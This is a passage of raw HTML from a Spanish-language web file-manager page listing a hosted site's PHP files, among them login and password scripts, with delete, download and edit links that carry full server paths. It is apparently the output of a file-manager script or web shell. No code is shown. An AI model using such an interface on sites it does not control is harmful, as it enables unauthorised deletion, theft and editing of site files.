                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::login.php">login.php</a></td>
                    <td>Archivo</td>
                    <td>1.37 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/login.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/login.php::login.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::login.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mapa-del-sitio.php">mapa-del-sitio.php</a></td>
                    <td>Archivo</td>
                    <td>2 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mapa-del-sitio.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mapa-del-sitio.php::mapa-del-sitio.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mapa-del-sitio.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::miavatar_cambiar.php">miavatar_cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>812 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/miavatar_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/miavatar_cambiar.php::miavatar_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::miavatar_cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes.php">misimagenes.php</a></td>
                    <td>Archivo</td>
                    <td>3.33 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes.php::misimagenes.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes_cambiar.php">misimagenes_cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>987 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes_cambiar.php::misimagenes_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes_cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mod-history.php">mod-history.php</a></td>
                    <td>Archivo</td>
                    <td>1.37 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mod-history.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mod-history.php::mod-history.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mod-history.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::monitor.php">monitor.php</a></td>
                    <td>Archivo</td>
                    <td>6.57 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/monitor.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/monitor.php::monitor.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::monitor.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::next.php">next.php</a></td>
                    <td>Archivo</td>
                    <td>430 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/next.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/next.php::next.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::next.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::notificaciones-ajax.php">notificaciones-ajax.php</a></td>
                    <td>Archivo</td>
                    <td>5.63 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones-ajax.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones-ajax.php::notificaciones-ajax.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::notificaciones-ajax.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-cambiar.php">password-cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>1.48 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-cambiar.php::password-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-form.php">password-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.33 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-form.php::password-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password.php">password.php</a></td>
                    <td>Archivo</td>
                    <td>2.77 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password.php::password.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::perfil.php">perfil.php</a></td>
                    <td>Archivo</td>
                    <td>43.44 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/perfil.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/perfil.php::perfil.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::perfil.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::playlist.php">playlist.php</a></td>
                    <td>Archivo</td>
                    <td>1.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/playlist.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/playlist.php::playlist.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::playlist.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.borrar.php">post.borrar.php</a></td>
                    <td>Archivo</td>
                    <td>630 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.borrar.php::post.borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.borrar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.php">post.php</a></td>
                    <td>Archivo</td>
                    <td>69 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.php::post.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::posts.php">posts.php</a></td>
                    <td>Archivo</td>
                    <td>2.84 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/posts.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/posts.php::posts.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::posts.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ppdias.php">ppdias.php</a></td>
                    <td>Archivo</td>
                    <td>1.07 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ppdias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ppdias.php::ppdias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ppdias.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::prev.php">prev.php</a></td>
                    <td>Archivo</td>
                    <td>439 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/prev.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/prev.php::prev.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::prev.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::preview.php">preview.php</a></td>
                    <td>Archivo</td>
                    <td>3.3 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/preview.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/preview.php::preview.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::preview.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::privacidad-de-datos.php">privacidad-de-datos.php</a></td>
                    <td>Archivo</td>
                    <td>7.99 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/privacidad-de-datos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/privacidad-de-datos.php::privacidad-de-datos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::privacidad-de-datos.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::protocolo.php">protocolo.php</a></td>
                    <td>Archivo</td>
                    <td>11.3 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/protocolo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/protocolo.php::protocolo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::protocolo.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recaptcha.php">recaptcha.php</a></td>
                    <td>Archivo</td>
                    <td>1.05 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha.php::recaptcha.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recaptcha.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar-form.php">recomendar-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.1 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar-form.php::recomendar-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar.php">recomendar.php</a></td>
                    <td>Archivo</td>
                    <td>1.14 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar.php::recomendar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-email.php">registro-check-email.php</a></td>
                    <td>Archivo</td>
                    <td>214 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-email.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-email.php::registro-check-email.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-email.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-nick.php">registro-check-nick.php</a></td>
                    <td>Archivo</td>
                    <td>232 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-nick.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-check-nick.php::registro-check-nick.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-check-nick.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-confirmar.php">registro-confirmar.php</a></td>
                    <td>Archivo</td>
                    <td>698 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-confirmar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-confirmar.php::registro-confirmar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-confirmar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-form.php">registro-form.php</a></td>
                    <td>Archivo</td>
                    <td>24.01 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-form.php::registro-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-geo.php">registro-geo.php</a></td>
                    <td>Archivo</td>
                    <td>1.33 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-geo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-geo.php::registro-geo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-geo.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-notificacion.php">registro-notificacion.php</a></td>
                    <td>Archivo</td>
                    <td>303 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-notificacion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/registro-notificacion.php::registro-notificacion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::registro-notificacion.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
